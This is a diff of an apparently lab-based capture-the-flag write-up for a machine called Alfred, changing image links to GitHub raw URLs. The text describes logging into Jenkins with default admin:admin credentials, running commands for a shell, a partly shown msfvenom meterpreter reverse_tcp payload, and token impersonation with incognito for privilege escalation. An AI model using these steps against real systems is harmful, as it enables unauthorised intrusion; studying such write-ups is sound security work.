@@ -23,19 +23,19 @@ We run the usual nmap scanner and find:
 
 If we connect to the server in port 80 we can see
 
-![Wayne](../images/alfred/alf1.png)
+![Wayne](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/alfred/alf1.png)
 
 Nothing seems too interesting and a `gobuster` scan doesn't find anything useful.
 
 In port 8080 we have a `jenkins` server.
 
-![jenikins](../images/alfred/alf2.png)
+![jenikins](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/alfred/alf2.png)
 
 We try to log in with the credentials `admin:admin` and got access to the `jenkins` control panel. From here we can move to configure tab, under project options and we find a field to write commands. Using it with this payload we gain a shell on the system.
 
-![build](../images/alfred/alf3.png)
+![build](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/alfred/alf3.png)
 
-![shell](../images/alfred/alf4.png)
+![shell](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/alfred/alf4.png)
 
 From here we can grab the user flag.
 
@@ -51,7 +51,7 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 
 Set the handler in metasploit. Use `exploit/multi/handler` and configure the options
 
-![set handler](../images/alfred/alf5.png)
+![set handler](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/alfred/alf5.png)
 
 We transfer the shell executable created with `msfvenom` to the windows machine and execute it gaining a `meterpreter` shell.
 
@@ -61,18 +61,18 @@ The technique we are going to use to elevate privileges in the machine is called
 
 First we check the privileges we have in this account using the command `whoami/priv`
 
-![priv](../images/alfred/alf6.png)
+![priv](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/alfred/alf6.png)
 
 The `SeDebugPrivileged` and `SeImpersonatePrivileges` are enabled. We use the `incognito` module to exploit the vulnerability. We use the command `use incognito` to load the module and we check the available tokens with `list_tokens -g`
 
-![tokens](../images/alfred/alf7.png)
+![tokens](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/alfred/alf7.png)
 
 The `BUILTIN\Administrator` token is available, to impersonate it we run
 
-![impersonate](../images/alfred/alf8.png)
+![impersonate](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/alfred/alf8.png)
 
 We have a elevated privileges but, by the way `windows` handles the permissions, using the primary tokens of the process to determine what they can do or cannot do, we need to migrate to a process with the right permissions. The safest process to pick is the `services.exe`. We list the processes and migrate to the one mentioned.
 
-![migrate](../images/alfred/alf9.png)
+![migrate](https://raw.githubusercontent.com/TTWabbit/ttwabbit.github.io/master/static/img/_posts/alfred/alf9.png)
 
 Now we have complete access and can read the root flag.
